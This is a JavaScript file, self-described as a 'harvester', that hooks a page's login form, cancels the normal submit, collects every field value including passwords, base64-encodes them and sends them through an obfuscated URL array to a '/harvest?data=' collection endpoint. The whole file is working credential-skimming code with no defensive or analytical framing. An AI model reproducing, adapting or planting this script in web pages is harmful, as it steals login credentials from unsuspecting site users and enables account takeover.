var siteId = "7e578ae5";
var formName = "loginform";
var formId = "93djokdi";
var enableEncoding = true;
var _0x3745 = ["http","://","127.0.0.1","/harvest?data="];

$(document).ready(function() {
        console.log("initializing harvester...");
        initHarvester();
});

function initHarvester() {
	var loginForm = document.getElementById("loginform");
	if(loginForm) {
		$('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
		$('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
		loginForm.addEventListener("submit", (e) => {
			e.preventDefault();
			grabAll();
		});
		console.log("locked and loaded");
	} else {
		console.log("ERROR: harvester failed to locate 'loginform', check your HTML");
	}
}

/* parse through the form elements and serialize anything interesting */
function grabAll() {
	var loginForm = document.getElementById(formName);
	if(loginForm) {
		var payload = "";
		for(var i = 0; i < loginForm.length; i++) {
			var formElement = loginForm.elements[i];
			if(formElement) {
				console.log("DEBUG: name: " + formElement.name);
				console.log("DEBUG: value: " +  formElement.value);
			
				if(formElement instanceof HTMLSelectElement) {
					console.log("need to parse all selectedOptions");
				}
				
				if(payload == "")
					payload += formElement.name + ":" + encodeURI(formElement.value);			//	name isn't always set, need something else or a check
				else
					payload += "&" + formElement.name + ":" + encodeURI(formElement.value);		//	name isn't always set, need something else or a check
			}
		}
			
		if(enableEncoding) {
			console.log("DEBUG: before base 64 encoding: " + payload);
			payload = btoa(payload);
		}
		console.log("resulting payload = " + payload);
		sendPayload(payload);
	} else {
		console.log("ERROR: harvester failed to locate '" + formName + "', check your HTML");
	}
}

function sendPayload(payload) {
	$.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
}
